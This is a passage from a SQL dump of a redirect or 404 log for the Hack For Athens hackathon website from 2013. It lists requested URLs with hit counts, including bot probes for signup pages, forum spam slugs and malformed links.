12:08:38','0000-00-00 00:00:00'),(92,'http://hackforathens.org/profile.php?mode=register&agreed=true&coppa=0','','http://hackforathens.org/profile.php?mode=register','',7,0,'2013-05-07 12:08:40','0000-00-00 00:00:00'),(93,'http://hackforathens.org/ucp.php?mode=register','','http://hackforathens.org/','',7,0,'2013-05-07 12:08:41','0000-00-00 00:00:00'),(94,'http://hackforathens.org/account/register.php','','http://hackforathens.org/','',7,0,'2013-05-07 12:08:48','0000-00-00 00:00:00'),(95,'http://hackforathens.org/join.php','','http://hackforathens.org/','',22,0,'2013-05-07 12:08:50','0000-00-00 00:00:00'),(96,'http://hackforathens.org/join_form.php','','http://hackforathens.org/','',7,0,'2013-05-07 12:08:51','0000-00-00 00:00:00'),(97,'http://hackforathens.org/YaBB.cgi/','','','',7,0,'2013-05-07 12:09:01','0000-00-00 00:00:00'),(98,'http://hackforathens.org/YaBB.pl/','','','',7,0,'2013-05-07 12:09:03','0000-00-00 00:00:00'),(99,'http://hackforathens.org/member/register','','http://hackforathens.org/','',10,0,'2013-05-07 12:09:04','0000-00-00 00:00:00'),(100,'http://hackforathens.org/index.php/forums/member/register','','http://hackforathens.org/','',10,0,'2013-05-07 12:09:05','0000-00-00 00:00:00'),(101,'http://hackforathens.org/forum/member/register','','http://hackforathens.org/','',10,0,'2013-05-07 12:09:06','0000-00-00 00:00:00'),(102,'http://www.hackforathens.org/forum/faq','','','',1,0,'2013-05-09 01:18:34','0000-00-00 00:00:00'),(103,'http://hackforathens.org/www.linkedin.com/pub/margaret-wagner-dahl/12/38b/b16/','','','',80,0,'2013-05-10 07:11:43','0000-00-00 00:00:00'),(104,'http://hackforathens.org/www.linkedin.com/pub/bob-pinckney/7/9a6/744/','','','',79,0,'2013-05-10 07:11:44','0000-00-00 00:00:00'),(105,'http://hackforathens.org/hack/','','','',1,0,'2013-05-10 15:41:36','0000-00-00 00:00:00'),(106,'http://hackforathens.org/login.php','','','',8,0,'2013-05-13 02:05:54','0000-00-00 00:00:00'),(107,'http://hackforathens.org/member.php?mod=logging&action=login','','http://hackforathens.org/','',2,0,'2013-05-13 02:05:57','0000-00-00 00:00:00'),(108,'http://hackforathens.org/member.php?mod=register','','http://hackforathens.org/','',2,0,'2013-05-13 02:06:13','0000-00-00 00:00:00'),(109,'http://hackforathens.org/modules.php?app=user_reg','','http://hackforathens.org/','',2,0,'2013-05-13 02:09:43','0000-00-00 00:00:00'),(110,'http://hackforathens.org/member/reg.php','','','',2,0,'2013-05-13 02:10:14','0000-00-00 00:00:00'),(111,'http://hackforathens.org/logging.php?action=login','','http://hackforathens.org/','',2,0,'2013-05-13 02:10:33','0000-00-00 00:00:00'),(112,'http://hackforathens.org/login.php?action=quit','','','',2,0,'2013-05-13 02:11:32','0000-00-00 00:00:00'),(113,'http://hackforathens.org/member/index_do.php?fmdo=user&dopost=regnew','','http://hackforathens.org/','',2,0,'2013-05-13 02:20:14','0000-00-00 00:00:00'),(114,'http://hackforathens.org/post.php','','','',2,0,'2013-05-13 02:22:22','0000-00-00 00:00:00'),(115,'http://hackforathens.org/reg.php','','','',2,0,'2013-05-13 02:22:47','0000-00-00 00:00:00'),(116,'http://hackforathens.org/index.php?option=com_cmc&format=raw&task=webhooks.request&key=4946f50750b8044aef599f71e93851df','','','',235,0,'2013-05-15 02:33:01','0000-00-00 00:00:00'),(117,'http://hackforathens.org/wp-signup.php','','','',6,0,'2013-05-15 16:49:43','0000-00-00 00:00:00'),(118,'http://hackforathens.org/member/','','','',1,0,'2013-05-18 23:03:50','0000-00-00 00:00:00'),(119,'http://hackforathens.org/register.php?type=company','','','',3,0,'2013-05-18 23:07:44','0000-00-00 00:00:00'),(120,'http://hackforathens.org/member/register.php?type=company','','','',3,0,'2013-05-18 23:07:49','0000-00-00 00:00:00'),(121,'http://hackforathens.org/member.php/register.php?type=company','','','',3,0,'2013-05-18 23:07:50','0000-00-00 00:00:00'),(122,'http://www.hackforathens.org/index.php/kunena/main-forum','','','',2,0,'2013-05-19 15:55:35','0000-00-00 00:00:00'),(123,'http://www.hackforathens.org/www.linkedin.com/pub/margaret-wagner-dahl/12/38b/b16/','','','',33,0,'2013-05-21 03:09:31','0000-00-00 00:00:00'),(124,'http://www.hackforathens.org/www.linkedin.com/pub/bob-pinckney/7/9a6/744/','','','',30,0,'2013-05-21 07:48:41','0000-00-00 00:00:00'),(125,'http://hackforathens.org/get-involved/datasets','','http://hackforathens.org/','',27,0,'2013-05-22 21:53:17','0000-00-00 00:00:00'),(126,'http://hackforathens.org/get-involved/challenges','','','',42,0,'2013-05-23 00:05:27','0000-00-00 00:00:00'),(127,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8f2e423c74-Update_May_17th5_16_2013&utm_medium=email&utm_term=0_1e4599e8a6-8f2e423c74-2752573','','','',3,0,'2013-05-23 23:46:25','0000-00-00 00:00:00'),(128,'http://hackforathens.orghttp//hackforathens.org','','','',1,0,'2013-05-24 10:39:58','0000-00-00 00:00:00'),(129,'http://hackforathens.org/get-involved/challenges/18-challenges/48-safe-drinking-water-challenge','','','',3,0,'2013-05-24 14:59:36','0000-00-00 00:00:00'),(130,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8f2e423c74-Update_May_17th5_16_2013&utm_medium=email&utm_term=0_1e4599e8a6-8f2e423c74-2330485','','','',1,0,'2013-05-25 04:54:31','0000-00-00 00:00:00'),(131,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8939906cf8-One_Week_Till_Hack_For_Athens_5_25_2013&utm_medium=email&utm_term=0_1e4599e8a6-8939906cf8-2906945','','','',1,0,'2013-05-25 14:11:22','0000-00-00 00:00:00'),(132,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8939906cf8-One_Week_Till_Hack_For_Athens_5_25_2013&utm_medium=email&utm_term=0_1e4599e8a6-8939906cf8-2330557','','','',1,0,'2013-05-25 14:21:28','0000-00-00 00:00:00'),(133,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8939906cf8-One_Week_Till_Hack_For_Athens_5_25_2013&utm_medium=email&utm_term=0_1e4599e8a6-8939906cf8-2330525','','','',1,0,'2013-05-25 14:53:47','0000-00-00 00:00:00'),(134,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8939906cf8-One_Week_Till_Hack_For_Athens_5_25_2013&utm_medium=email&utm_term=0_1e4599e8a6-8939906cf8-2330545','','','',1,0,'2013-05-25 15:04:48','0000-00-00 00:00:00'),(135,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8939906cf8-One_Week_Till_Hack_For_Athens_5_25_2013&utm_medium=email&utm_term=0_1e4599e8a6-8939906cf8-2330569','','','',1,0,'2013-05-25 16:04:36','0000-00-00 00:00:00'),(136,'http://www.hackforathens.org/get-involved/datasets','','','',13,0,'2013-05-25 16:32:38','0000-00-00 00:00:00'),(137,'http://www.hackforathens.org/get-involved/challenges','','','',16,0,'2013-05-25 16:34:41','0000-00-00 00:00:00'),(138,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8939906cf8-One_Week_Till_Hack_For_Athens_5_25_2013&utm_medium=email&utm_term=0_1e4599e8a6-8939906cf8-2333457','','','',2,0,'2013-05-25 16:53:44','0000-00-00 00:00:00'),(139,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8939906cf8-One_Week_Till_Hack_For_Athens_5_25_2013&utm_medium=email&utm_term=0_1e4599e8a6-8939906cf8-2330537','','','',1,0,'2013-05-26 00:33:40','0000-00-00 00:00:00'),(140,'http://hackforathens.org/get-involved/challenges?utm_source=Hack+For+Athens&utm_campaign=8939906cf8-One_Week_Till_Hack_For_Athens_5_25_2013&utm_medium=email&utm_term=0_1e4599e8a6-8939906cf8-2331469','','','',1,0,'2013-05-26 02:23:42','0000-00-00 00:00:00'),(141,'http://hackforathens.org/event/discussion/statistics','','','',2,0,'2013-05-26 13:12:32','0000-00-00 00:00:00'),(142,'http://hackforathens.org/event/discussion/suggestion-box','','','',2,0,'2013-05-27 00:28:23','0000-00-00 00:00:00'),(143,'http://hackforathens.org/index.php/get-involved/','','','',1,0,'2013-05-27 23:22:52','0000-00-00 00:00:00'),(144,'http://hackforathens.org/width=1','','','',1,0,'2013-05-28 14:11:13','0000-00-00 00:00:00'),(145,'http://hackforathens.org/event/discussion/general-information','','','',1,0,'2013-05-28 16:11:53','0000-00-00 00:00:00'),(146,'http://hackforathens.org/event/discussion/faq','','','',1,0,'2013-05-28 16:46:39','0000-00-00 00:00:00'),(147,'http://hackforathens.org/event/discussion/main-forum','','','',1,0,'2013-05-28 17:18:48','0000-00-00 00:00:00'),(148,'http://www.hackforathens.org/get-involved/discussion/general-information','','','',9,0,'2013-05-29 03:05:51','0000-00-00 00:00:00'),(149,'http://hackforathens.org/get-involved/discussion/suggestion-box','','','',6,0,'2013-05-29 03:34:54','0000-00-00 00:00:00'),(150,'http://www.hackforathens.org/www.linkedin.com/pub/tom-robertson/18/632/6a5/','','','',32,0,'2013-05-29 05:34:34','0000-00-00 00:00:00'),(151,'http://hackforathens.org/get-involved/discussion/recent','','','',34,0,'2013-05-29 05:56:55','0000-00-00 00:00:00'),(152,'http://hackforathens.org/get-involved/discussion/index','','','',49,0,'2013-05-29 06:12:26','0000-00-00 00:00:00'),(153,'http://hackforathens.org/index.php/get-involved/discussion','','','',6,0,'2013-05-29 07:15:06','0000-00-00 00:00:00'),(154,'http://www.hackforathens.org/get-involved/discussion','','','',9,0,'2013-05-29 07:39:25','0000-00-00 00:00:00'),(155,'http://hackforathens.org/index.php/get-involved/discussion/general-information','','','',3,0,'2013-05-29 08:57:44','0000-00-00 00:00:00'),(156,'http://hackforathens.org/index.php/get-involved/discussion/faq','','','',3,0,'2013-05-29 08:58:18','0000-00-00 00:00:00'),(157,'http://www.hackforathens.org/get-involved/discussion/faq','','','',7,0,'2013-05-29 09:04:11','0000-00-00 00:00:00'),(158,'http://hackforathens.org/index.php/get-involved/discussion/suggestion-box','','','',4,0,'2013-05-29 09:04:40','0000-00-00 00:00:00'),(159,'http://www.hackforathens.org/index.php/get-involved/discussion/search','','','',8,0,'2013-05-29 09:28:14','0000-00-00 00:00:00'),(160,'http://www.hackforathens.org/index.php/get-involved/discussion/recent','','','',7,0,'2013-05-29 09:29:49','0000-00-00 00:00:00'),(161,'http://www.hackforathens.org/index.php/get-involved/discussion','','','',9,0,'2013-05-29 09:30:40','0000-00-00 00:00:00'),(162,'http://hackforathens.org/get-involved/discussion/user/list','','','',2,0,'2013-05-29 13:33:07','0000-00-00 00:00:00'),(163,'http://hackforathens.org/get-involved/discussion/search','','','',25,0,'2013-05-29 18:40:41','0000-00-00 00:00:00'),(164,'http://hackforathens.org/get-involved/discussion/faq','','','',12,0,'2013-05-30 05:20:02','0000-00-00 00:00:00'),(165,'http://www.hackforathens.org/get-involved/discussion/suggestion-box','','','',10,0,'2013-05-30 05:47:46','0000-00-00 00:00:00'),(166,'http://hackforathens.org/get-involved/discussion/general-information','','','',14,0,'2013-05-30 08:45:40','0000-00-00 00:00:00'),(167,'http://hackforathens.org/get-involved/discussion/index/','','','',4,0,'2013-05-30 09:01:51','0000-00-00 00:00:00'),(168,'http://hackforathens.org/get-involved/discussion/statistics','','http://hackforathens.org/get-involved/discussion/statistics','',18,0,'2013-05-30 10:41:57','0000-00-00 00:00:00'),(169,'http://www.hackforathens.org/index.php/get-involved/discussion/index','','','',7,0,'2013-05-30 11:32:56','0000-00-00 00:00:00'),(170,'http://hackforathens.org/index.php/get-involved/discussion/credits','','','',15,0,'2013-05-30 13:59:07','0000-00-00 00:00:00'),(171,'http://hackforathens.org/index.php/get-involved/discussion/recent','','','',12,0,'2013-05-30 16:36:42','0000-00-00 00:00:00'),(172,'http://hackforathens.org/get-involved/discussion/main-forum','','','',9,0,'2013-05-30 17:30:26','0000-00-00 00:00:00'),(173,'http://hackforathens.org/www.linkedin.com/pub/tom-robertson/18/632/6a5/','','','',78,0,'2013-06-02 07:31:56','0000-00-00 00:00:00'),(174,'http://hackforathens.org/get-involved/teams/create-team','','','',22,0,'2013-06-02 21:17:42','0000-00-00 00:00:00'),(175,'http://hackforathens.org/get-involved/challenges/submit-challenges','','','',25,0,'2013-06-02 21:17:53','0000-00-00 00:00:00'),(176,'http://hackforathens.org/get-involved/datasets/submit-datasets','','','',26,0,'2013-06-02 21:17:54','0000-00-00 00:00:00'),(177,'http://hackforathens.org/index.php/get-involved/challenges/submit-challenges','','','',8,0,'2013-06-03 08:17:18','0000-00-00 00:00:00'),(178,'http://hackforathens.org/index.php/get-involved/challenges','','','',2,0,'2013-06-03 13:12:54','0000-00-00 00:00:00'),(179,'http://hackforathens.org/contact\"','','http://hackforathens.org/login/','',1,0,'2013-06-03 16:51:08','0000-00-00 00:00:00'),(180,'http://hackforathens.org/login/index.php?option=com_registration&task=register','','http://hackforathens.org/login/index.php?option=com_registration&task=register','',1,0,'2013-06-03 16:52:18','0000-00-00 00:00:00'),(181,'http://hackforathens.org/index.php/get-involved/datasets','','','',1,0,'2013-06-04 00:39:37','0000-00-00 00:00:00'),(182,'http://hackforathens.org/register/index.php?option=com_registration&task=register','','http://hackforathens.org/register/index.php?option=com_registration&task=register','',2,0,'2013-06-04 11:38:55','0000-00-00 00:00:00'),(183,'http://www.hackforathens.org/get-involved/teams/create-team','','','',11,0,'2013-06-04 17:44:41','0000-00-00 00:00:00'),(184,'http://hackforathens.org/site/signup.php','','http://hackforathens.org/','',4,0,'2013-06-05 11:06:06','0000-00-00 00:00:00'),(185,'http://hackforathens.org/blogs/load/recent','','http://hackforathens.org/','',4,0,'2013-06-05 11:06:09','0000-00-00 00:00:00'),(186,'http://hackforathens.org/member/join.php','','http://hackforathens.org/','',4,0,'2013-06-05 11:06:10','0000-00-00 00:00:00'),(187,'http://www.hackforathens.org/get-involved/discussion/recent','','','',17,0,'2013-06-05 12:48:39','0000-00-00 00:00:00'),(188,'http://hackforathens.org/get-involved/teams/team-forums','','','',22,0,'2013-06-05 13:21:26','0000-00-00 00:00:00'),(189,'http://hackforathens.org/index.php/get-involved/discussion/main-forum','','','',107,0,'2013-06-05 19:07:32','0000-00-00 00:00:00'),(190,'http://hackforathens.org/get-involved/discussion/recent/','','http://hackforathens.org/get-involved/discussion/recent/','',5,0,'2013-06-06 02:04:36','0000-00-00 00:00:00'),(191,'http://www.hackforathens.org/get-involved/teams/team-forums','','','',10,0,'2013-06-06 03:15:26','0000-00-00 00:00:00'),(192,'http://hackforathens.org/index.php/get-involved/discussion/index','','','',10,0,'2013-06-06 11:04:15','0000-00-00 00:00:00'),(193,'http://hackforathens.org/get-involved/discussion/user/291-outdoorsblogger','','','',2,0,'2013-06-07 00:02:50','0000-00-00 00:00:00'),(194,'http://hackforathens.org/get-involved/discussion/credits','','','',6,0,'2013-06-07 06:52:47','0000-00-00 00:00:00'),(195,'http://hackforathens.org/index.php/get-involved/datasets/submit-datasets','','','',8,0,'2013-06-07 08:07:41','0000-00-00 00:00:00'),(196,'http://hackforathens.org/get-involved/discussion','','','',15,0,'2013-06-07 16:39:36','0000-00-00 00:00:00'),(197,'http://hackforathens.org/get-involved/discussion/topics/mode-topics/sel-720?format=feed&type=rss','','','',2,0,'2013-06-08 11:39:00','0000-00-00 00:00:00'),(198,'http://www.hackforathens.org/get-involved/discussion/credits','','','',28,0,'2013-06-08 12:06:06','0000-00-00 00:00:00'),(199,'http://HACKFORATHENS.org/tmp/templates.php','','','',1,0,'2013-06-09 12:39:54','0000-00-00 00:00:00'),(200,'http://hackforathens.org/index.php/get-involved/discussion/statistics','','','',6,0,'2013-06-10 09:19:53','0000-00-00 00:00:00'),(201,'http://www.hackforathens.org/get-involved/challenges/submit-challenges','','','',14,0,'2013-06-10 09:44:14','0000-00-00 00:00:00'),(202,'http://hackforathens.org/get-involved/discussion/general-information/1-welcome-to-the-hackforathens-forum','','','',5,0,'2013-06-10 09:44:47','0000-00-00 00:00:00'),(203,'http://www.hackforathens.org/get-involved/datasets/submit-datasets?view=form','','','',9,0,'2013-06-10 11:39:28','0000-00-00 00:00:00'),(204,'http://www.hackforathens.org/get-involved/discussion/index','','','',13,0,'2013-06-10 13:43:57','0000-00-00 00:00:00'),(205,'http://www.hackforathens.org/get-involved/discussion/search','','','',11,0,'2013-06-10 17:23:16','0000-00-00 00:00:00'),(206,'http://hackforathens.org/get-involved/discussion/statistics++++++++++++++++++++++Result:+','','http://hackforathens.org/get-involved/discussion/statistics++++++++++++++++++++++Result:+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2','',1,0,'2013-06-10 17:31:19','0000-00-00 00:00:00'),(207,'http://hackforathens.org/get-involved/datasets/submit-datasets?view=form','','','',5,0,'2013-06-10 22:36:49','0000-00-00 00:00:00'),(208,'http://hackforathens.org/get-involved/discussion/statistics/','','http://hackforathens.org/get-involved/discussion/statistics/','',1,0,'2013-06-11 08:30:53','0000-00-00 00:00:00'),(209,'http://hackforathens.org/get-involved/discussion/user/254-kstorm','','','',2,0,'2013-06-11 11:37:54','0000-00-00 00:00:00'),(210,'http://www.hackforathens.org/get-involved/datasets/submit-datasets','','','',11,0,'2013-06-11 13:47:07','0000-00-00 00:00:00'),(211,'http://hackforathens.org/get-involved/challenges/submit-challenges?view=form','','','',4,0,'2013-06-11 14:34:02','0000-00-00 00:00:00'),(212,'http://www.hackforathens.org/get-involved/discussion/statistics','','','',19,0,'2013-06-11 19:53:10','0000-00-00 00:00:00'),(213,'http://www.hackforathens.org/get-involved/discussion/recent/','','http://www.hackforathens.org/get-involved/discussion/recent/','',1,0,'2013-06-12 04:15:50','0000-00-00 00:00:00'),(214,'http://www.hackforathens.org/get-involved/discussion/user/list','','','',10,0,'2013-06-12 09:32:35','0000-00-00 00:00:00'),(215,'http://hackforathens.org/index.php/get-involved/discussion/general-information/5-coach-coupons-printable-chanel-iphone-case','','http://hackforathens.org/index.php/get-involved/discussion/general-information/5-coach-coupons-printable-chanel-iphone-case','',16,0,'2013-06-12 09:43:29','0000-00-00 00:00:00'),(216,'http://www.hackforathens.org/get-involved/discussion/user/302-bovogygop','','','',7,0,'2013-06-12 19:37:30','0000-00-00 00:00:00'),(217,'http://hackforathens.org/get-involved/discussion/','','','',3,0,'2013-06-13 03:39:14','0000-00-00 00:00:00'),(218,'http://hackforathens.org/index.php/get-involved/discussion/general-information/3-chanel-iphone-case-coach-high-tops','','','',10,0,'2013-06-13 06:53:47','0000-00-00 00:00:00'),(219,'http://hackforathens.org/index.php/get-involved/discussion/general-information/2-coach-factory-com-coach','','','',2,0,'2013-06-13 07:15:14','0000-00-00 00:00:00'),(220,'http://www.hackforathens.org/index.php/get-involved/teams/create-team','','','',9,0,'2013-06-13 07:50:26','0000-00-00 00:00:00'),(221,'http://hackforathens.org/index.php/get-involved/discussion/general-information/4-cheap-coach-boots-coach-swingpack','','','',20,0,'2013-06-13 08:20:46','0000-00-00 00:00:00'),(222,'http://hackforathens.org/index.php/get-involved/discussion/general-information/4-cheap-coach-boots-coach-swingpack/trackback/','','http://hackforathens.org/index.php/get-involved/discussion/general-information/4-cheap-coach-boots-coach-swingpack','',1,0,'2013-06-13 15:17:26','0000-00-00 00:00:00'),(223,'http://hackforathens.org/component/','','','',37,0,'2013-06-14 11:15:28','0000-00-00 00:00:00'),(224,'http://www.hackforathens.org/get-involved/discussion/','','','',7,0,'2013-06-14 13:46:48','0000-00-00 00:00:00'),(225,'http://www.hackforathens.org/join.php','','http://www.hackforathens.org/join.php','',4,0,'2013-06-14 15:26:59','0000-00-00 00:00:00'),(226,'http://www.hackforathens.org/signup','','','',4,0,'2013-06-14 15:27:14','0000-00-00 00:00:00'),(227,'http://www.hackforathens.org/register\"','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:27:21','0000-00-00 00:00:00'),(228,'http://www.hackforathens.org/tiki-register.php','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:27:30','0000-00-00 00:00:00'),(229,'http://www.hackforathens.org/user/register','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:27:36','0000-00-00 00:00:00'),(230,'http://www.hackforathens.org/sign_up.html','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:27:38','0000-00-00 00:00:00'),(231,'http://www.hackforathens.org/login.php','','','',4,0,'2013-06-14 15:27:47','0000-00-00 00:00:00'),(232,'http://www.hackforathens.org/member.php?mod=logging&action=login','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:29:10','0000-00-00 00:00:00'),(233,'http://www.hackforathens.org/member.php?mod=register','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:29:15','0000-00-00 00:00:00'),(234,'http://www.hackforathens.org/member/','','','',1,0,'2013-06-14 15:29:22','0000-00-00 00:00:00'),(235,'http://www.hackforathens.org/modules.php?app=user_reg','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:29:37','0000-00-00 00:00:00'),(236,'http://www.hackforathens.org/signup/','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:29:40','0000-00-00 00:00:00'),(237,'http://www.hackforathens.org/member/reg.php','','','',1,0,'2013-06-14 15:29:42','0000-00-00 00:00:00'),(238,'http://www.hackforathens.org/logging.php?action=login','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:29:47','0000-00-00 00:00:00'),(239,'http://www.hackforathens.org/register.php','','http://www.hackforathens.org/','',7,0,'2013-06-14 15:29:53','0000-00-00 00:00:00'),(240,'http://www.hackforathens.org/login.php?action=quit','','','',1,0,'2013-06-14 15:30:00','0000-00-00 00:00:00'),(241,'http://www.hackforathens.org/signup.php','','','',6,0,'2013-06-14 15:30:05','0000-00-00 00:00:00'),(242,'http://www.hackforathens.org/index.php?option=com_registration&task=register','','http://www.hackforathens.org/index.php?option=com_registration&task=register','',1,0,'2013-06-14 15:31:20','0000-00-00 00:00:00'),(243,'http://www.hackforathens.org/profile.php?mode=register&agreed=true&coppa=0','','http://www.hackforathens.org/profile.php?mode=register','',1,0,'2013-06-14 15:31:32','0000-00-00 00:00:00'),(244,'http://www.hackforathens.org/ucp.php?mode=register','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:31:33','0000-00-00 00:00:00'),(245,'http://www.hackforathens.org/member/index_do.php?fmdo=user&dopost=regnew','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:31:55','0000-00-00 00:00:00'),(246,'http://www.hackforathens.org/account/register.php','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:32:04','0000-00-00 00:00:00'),(247,'http://www.hackforathens.org/post.php','','','',1,0,'2013-06-14 15:32:12','0000-00-00 00:00:00'),(248,'http://www.hackforathens.org/register.php?type=company','','','',2,0,'2013-06-14 15:32:16','0000-00-00 00:00:00'),(249,'http://www.hackforathens.org/member/register.php?type=company','','','',2,0,'2013-06-14 15:32:17','0000-00-00 00:00:00'),(250,'http://www.hackforathens.org/member.php/register.php?type=company','','','',2,0,'2013-06-14 15:32:18','0000-00-00 00:00:00'),(251,'http://www.hackforathens.org/reg.php','','','',1,0,'2013-06-14 15:32:25','0000-00-00 00:00:00'),(252,'http://www.hackforathens.org/join_form.php','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:32:28','0000-00-00 00:00:00'),(253,'http://www.hackforathens.org/YaBB.cgi/','','','',1,0,'2013-06-14 15:32:42','0000-00-00 00:00:00'),(254,'http://www.hackforathens.org/YaBB.pl/','','','',1,0,'2013-06-14 15:32:43','0000-00-00 00:00:00'),(255,'http://www.hackforathens.org/member/register','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:32:46','0000-00-00 00:00:00'),(256,'http://www.hackforathens.org/index.php/forums/member/register','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:32:47','0000-00-00 00:00:00'),(257,'http://www.hackforathens.org/forum/member/register','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:32:48','0000-00-00 00:00:00'),(258,'http://www.hackforathens.org/login.php?part=register','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:32:51','0000-00-00 00:00:00'),(259,'http://www.hackforathens.org/site/signup.php','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:32:53','0000-00-00 00:00:00'),(260,'http://www.hackforathens.org/blogs/load/recent','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:32:56','0000-00-00 00:00:00'),(261,'http://www.hackforathens.org/member/join.php','','http://www.hackforathens.org/','',1,0,'2013-06-14 15:33:00','0000-00-00 00:00:00'),(262,'http://www.hackforathens.org/index.php/get-involved/datasets/submit-datasets','','','',10,0,'2013-06-14 21:30:28','0000-00-00 00:00:00'),(263,'http://hackforathens.org/index.php/get-involved/discussion/search','','','',9,0,'2013-06-17 06:16:45','0000-00-00 00:00:00'),(264,'http://hackforathens.org/index.php/get-involved/teams/create-team','','','',5,0,'2013-06-18 18:24:58','0000-00-00 00:00:00'),(265,'http://www.hackforathens.org/get-involved/discussion/general-information/5-coach-coupons-printable-chanel-iphone-case','','','',7,0,'2013-06-18 19:45:46','0000-00-00 00:00:00'),(266,'http://www.hackforathens.org/component/','','','',47,0,'2013-06-19 03:25:27','0000-00-00 00:00:00'),(267,'http://www.hackforathens.org/get-involved/discussion/main-forum','','','',8,0,'2013-06-19 09:32:41','0000-00-00 00:00:00'),(268,'http://www.hackforathens.org/ /','','','',6,0,'2013-06-20 23:14:50','0000-00-00 00:00:00'),(269,'http://www.hackforathens.orghttp//www.hackforathens.org/register','','http://www.hackforathens.org/register','',3,0,'2013-06-21 08:14:48','0000-00-00 00:00:00'),(270,'http://www.hackforathens.orghttp//www.hackforathens.org//www.hackforathens.org/register','','http://www.hackforathens.org//www.hackforathens.org/register','',3,0,'2013-06-21 08:14:52','0000-00-00 00:00:00'),(271,'http://hackforathens.orghttp//hackforathens.org/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics','','http://hackforathens.org/index.php/get-involved/discussion/statistics','',2,0,'2013-06-21 10:21:00','0000-00-00 00:00:00'),(272,'http://hackforathens.org/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics','','http://hackforathens.org/index.php/get-involved/discussion/statistics','',1,0,'2013-06-21 10:21:11','0000-00-00 00:00:00'),(273,'http://hackforathens.org/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics','','http://hackforathens.org/index.php/get-involved/discussion/statistics','',2,0,'2013-06-21 10:22:28','0000-00-00 00:00:00'),(274,'http://hackforathens.org/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics','','http://hackforathens.org/index.php/get-involved/discussion/statistics','',2,0,'2013-06-21 10:23:19','0000-00-00 00:00:00'),(275,'http://hackforathens.orghttp//hackforathens.org/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/disc','','http://hackforathens.org/index.php/get-involved/discussion/statistics','',1,0,'2013-06-21 10:23:26','0000-00-00 00:00:00'),(277,'http://hackforathens.org/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index.php/get-involved/discussion/statistics/index','','http://hackforathens.org/index.php/get-involved/discussion/statistics','',1,0,'2013-06-21 10:24:07','0000-00-00 00:00:00'),(280,'http://hackforathens.orghttp//hackforathens.org/index.php/get-involved/discussion/general-information/5-coach-coupons-printable-chanel-iphone-case','','http://hackforathens.org/index.php/get-involved/discussion/general-information/5-coach-coupons-printable-chanel-iphone-case','',2,0,'2013-06-21 15:11:52','0000-00-00 00:00:00'),(281,'http://hackforathens.orghttp//hackforathens.org/index.php/get-involved/discussion/general-information/5-coach-coupons-printabl/index.php/get-involved/discussion/general-information/5-coach-coupons-printabl/index.php/get-involved/discussion/general-informa','','http://hackforathens.org/index.php/get-involved/discussion/general-information/5-coach-coupons-printable-chanel-iphone-case','',1,0,'2013-06-21 15:12:50','0000-00-00 00:00:00'),(282,'http://hackforathens.org/index.php/get-involved/discussion/general-information/5-coach-coupons-printabl/index.php/get-involved/discussion/general-information/5-coach-coupons-printabl/index.php/get-involved/discussion/general-information/5-coach-coupons-pr','','http://hackforathens.org/index.php/get-involved/discussion/general-information/5-coach-coupons-printable-chanel-iphone-case','',1,0,'2013-06-21 15:12:54','0000-00-00 00:00:00'),(292,'http://www.hackforathens.org/index.php/get-involved/challenges/submit-challenges','','','',6,0,'2013-06-23 05:43:40','0000-00-00 00:00:00'),(293,'http://hackforathens.org/forum/index/','','http://hackforathens.org/forum/index/','',5,0,'2013-06-23 14:41:51','0000-00-00 00:00:00'),(294,'http://www.hackforathens.org/get-involved/discussion/topics/mode-topics/sel-720?format=feed&type=rss','','','',5,0,'2013-06-26 09:50:25','0000-00-00 00:00:00'),(295,'http://HACKFORATHENS.ORG/https://admissions.uga.edu/api/','','','',2,0,'2013-06-29 20:41:12','0000-00-00 00:00:00'),(296,'http://HACKFORATHENS.ORG/https://explore.data.gov/Banking-Finance-and-Insurance/FDIC-Summary-of-Deposits-SOD-Download-File/eq99-z357','','','',2,0,'2013-06-29 20:41:19','0000-00-00 00:00:00'),(297,'http://HACKFORATHENS.ORG/https://maps.google.com/maps','','','',3,0,'2013-06-29 20:41:25','0000-00-00 00:00:00'),(298,'http://HACKFORATHENS.ORG/https://twitter.com/hackforathens','','','',2,0,'2013-06-29 20:41:31','0000-00-00 